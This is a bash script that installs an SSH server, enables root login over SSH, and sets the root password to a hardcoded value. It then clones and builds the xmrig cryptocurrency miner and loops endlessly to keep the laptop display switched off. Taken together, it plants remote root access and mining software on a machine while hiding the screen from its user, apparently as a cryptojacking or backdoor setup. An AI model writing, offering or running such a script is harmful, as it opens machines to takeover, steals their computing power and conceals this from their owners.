#!/bin/bash

# Function to retrieve the IP address
get_ip() {
    ip=$(hostname -I | awk '{print $1}')
    if [ -z "$ip" ]; then
        echo "Error: Unable to retrieve IP address."
        exit 1
    else
        echo "Detected IP address: $ip"
    fi
}

# Check the IP address
get_ip

# Update package lists and install necessary packages
sudo apt-get update
sudo apt-get install openssh-server screen git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y

# Change PermitRootLogin to yes in sshd_config
sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config

# Restart sshd to apply the changes
sudo systemctl restart sshd

# Change root password to "Thoriq123!"
echo "root:Thoriq123!" | sudo chpasswd

# Clone xmrig repository and create build directory
git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build

# Change directory to xmrig/build
cd xmrig/build || exit

# Run CMake
cmake ..

# Build with make
make -j$(nproc)

# Function to disable the screen

while true; do
    # Disable laptop screen
    xrandr --output eDP --off
    xrandr --output eDP-1 --off

    # Sleep for 0.5 seconds
    sleep 0.5
done

wait
